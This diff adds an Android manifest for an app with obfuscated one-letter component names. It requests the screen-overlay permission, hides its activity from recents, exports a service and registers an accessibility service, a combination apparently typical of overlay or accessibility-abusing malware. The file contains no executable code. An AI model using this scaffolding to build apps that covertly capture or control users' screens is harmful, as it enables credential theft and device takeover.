@@ -1,0 +1,38 @@
+<?xml version='1.0' encoding='utf-8'?>
+<manifest
+	xmlns:android="http://schemas.android.com/apk/res/android"
+	package="l.Activity">
+	<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+	<!--<uses-permission android:name="android.permission.USE_FINGERPRINT"/>-->
+	<application
+		android:icon="@drawable/l"
+		android:label="@string/l"
+		android:theme="@style/t">
+		<activity
+			android:name="l.l"
+			android:label="@string/l"
+			android:excludeFromRecents="true"
+			android:screenOrientation="nosensor">
+			<intent-filter>
+				<action android:name="android.intent.action.MAIN"/>
+				<category android:name="android.intent.category.LAUNCHER"/>
+			</intent-filter>
+		</activity>
+		<service
+			android:name="l.s"
+			android:label="@string/l"
+			android:exported="true"/>
+		<service
+			android:name="l.as"
+			android:label="@string/l"
+			android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+			>
+			<meta-data
+				android:name="android.accessibilityservice"
+				android:resource="@xml/a"/>
+			<intent-filter>
+				<action android:name="android.accessibilityservice.AccessibilityService"/>
+			</intent-filter>
+		</service>
+	</application>
+</manifest>
